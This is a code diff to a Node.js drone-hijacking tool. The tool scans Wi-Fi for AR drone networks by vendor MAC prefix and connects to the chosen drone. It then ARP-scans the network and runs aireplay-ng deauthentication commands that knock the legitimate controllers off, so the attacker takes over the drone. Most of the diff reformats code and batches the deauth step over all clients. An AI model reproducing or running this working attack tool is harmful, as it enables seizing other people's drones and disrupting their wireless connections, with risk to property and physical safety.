@@ -45,6 +45,7 @@ function initNavControl() {
   // Drone client
   var drone = require("ar-drone").createClient();
   drone.config('general:navdata_demo', 'TRUE');
+  drone.animateLeds('blinkRed', 5, 2);
 
   // Socket
   var io = require('socket.io')(http);
@@ -92,10 +93,10 @@ function scanWifi() {
   return new Promise(function(resolve, reject) {
     // Check wifi interface
     var interfaces = os.networkInterfaces();
-    if ( interfaces[iface] === undefined) return reject("Error : "+iface+" interface not available");
+    if (interfaces[iface] === undefined) return reject("Error : " + iface + " interface not available");
 
     attackMAC = interfaces[iface][0].mac;
-    console.log('Attack from interface '+iface,attackMAC);
+    console.log('Attack from interface ' + iface, attackMAC);
 
     var droneMacs = ['90:03:B7', 'A0:14:3D', '00:12:1C', '00:26:7E'];
 
@@ -135,7 +136,14 @@ function scanWifi() {
       prompt.get(schema, function(err, result) {
         var choice = parseInt(result.choice);
         target = networks[choice];
-        resolve();
+        console.log('Connection to ' + target.mac + ' ...');
+        wifi.connect({
+          ssid: target.ssid
+        }, function(err) {
+          if (err) return reject(err);
+          console.log('Connected');
+          resolve();
+        });
       });
     });
   })
@@ -145,7 +153,7 @@ function scanWifi() {
 function connectWifi() {
   return new Promise(function(resolve, reject) {
 
-    console.log('Connection to '+target.mac+' ...');
+    console.log('Connection to ' + target.mac + ' ...');
     wifi.connect({
       ssid: target.ssid
     }, function(err) {
@@ -156,44 +164,53 @@ function connectWifi() {
   })
 }
 
-function initHack(){
+function initHack() {
   return new Promise(function(resolve, reject) {
 
-    if(!target.mac) return reject("Error : Drone MAC address is missing");
+    if (!target.mac) return reject("Error : Drone MAC address is missing");
 
     console.log('Scan network clients...');
-    arpscan(onResult, {interface: iface});
+    arpscan(onResult, {
+      interface: iface
+    });
 
-    function onResult(err, clients){
-        if(err) return reject(err);
+    function onResult(err, clients) {
+      if (err) return reject(err);
 
-        clients.forEach((client,i) => {
-          if(client.mac != target.mac && client.mac != attackMAC){
-            console.log('Disconnecting : '+client.mac);
-            var schema = {
-              properties: {
-                choice: {
-                  description: 'Disconnect '+client.mac+ ' ? (true,false)',
-                  default: false,
-                  type: 'boolean',
-                  message: 'Choice must be true or false',
-                  required: true
-                }
-              }
-            };
+      var deauthTargets = clients.filter(function(client) {
+        return client.mac != target.mac && client.mac != attackMAC
+      });
 
-            prompt.start();
-            prompt.get(schema, function(err, result) {
-              if(result.choice === true){
-                var exec = cp.exec;
-                exec('aireplay-ng -0 3 -a '+target.mac+' -c '+client.mac+' '+iface, function callback(err, stdout, stderr){
-                    if(err) return reject(stderr);
-                    resolve(stdout);
-                });
-              }
+      if (deauthTargets.length == 0){
+        console.log("No Clients to deauth");
+        resolve();
+      } else{
+        var schema = {
+          properties: {
+            choice: {
+              description: 'Disconnect ' + deauthTargets.length + ' clients ? (true,false)',
+              default: false,
+              type: 'boolean',
+              message: 'Choice must be true or false',
+              required: true
+            }
+          }
+        };
+
+        prompt.start();
+        prompt.get(schema, function(err, result) {
+          if (result.choice === true) {
+            deauthTargets.forEach((client, i) => {
+              console.log('Disconnecting : ' + client.mac);
+              var exec = cp.exec;
+              exec('aireplay-ng -0 3 -a ' + target.mac + ' -c ' + client.mac + ' ' + iface, function callback(err, stdout, stderr) {
+                if (err) return reject(stderr);
+                resolve(stdout);
+              });
             });
           }
         });
+      }
     }
   })
 }
